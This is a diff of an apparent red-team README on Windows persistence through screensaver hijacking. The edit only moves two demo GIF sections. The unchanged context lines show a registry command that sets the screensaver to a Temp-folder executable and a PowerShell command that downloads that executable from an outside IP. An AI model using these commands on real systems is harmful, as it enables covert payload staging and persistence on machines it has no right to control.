@@ -93,14 +93,6 @@ reg add "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /d C:\Windows\Temp\plogin.e
 powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.147.6/plogin.exe', 'C:\Windows\Temp\plogin.exe')"
 ```
 
-### ScreensaverHijack with command PWNED
-
-![ScreensaverHijack-with-command-PWNED](https://github.com/austin-lai/Persistence-through-Windows-Screensaver-Hijacking/blob/master/ScreensaverHijack-with-command-PWNED.gif)
-
-### ScreensaverHijack with sliver implants
-
-![ScreensaverHijack-with-sliver-implants](https://github.com/austin-lai/Persistence-through-Windows-Screensaver-Hijacking/blob/master/ScreensaverHijack-with-sliver-implants.gif)
-
 We may also use C++ and compile as screensaver register key changer executable using command below:
 
 ```bash
@@ -169,6 +161,14 @@ int main(int argc, char* argv[]) {
   return 0;
 }
 ```
+
+### ScreensaverHijack with command PWNED
+
+![ScreensaverHijack-with-command-PWNED](https://github.com/austin-lai/Persistence-through-Windows-Screensaver-Hijacking/blob/master/ScreensaverHijack-with-command-PWNED.gif)
+
+### ScreensaverHijack with sliver implants
+
+![ScreensaverHijack-with-sliver-implants](https://github.com/austin-lai/Persistence-through-Windows-Screensaver-Hijacking/blob/master/ScreensaverHijack-with-sliver-implants.gif)
 
 ## Additional Information
 
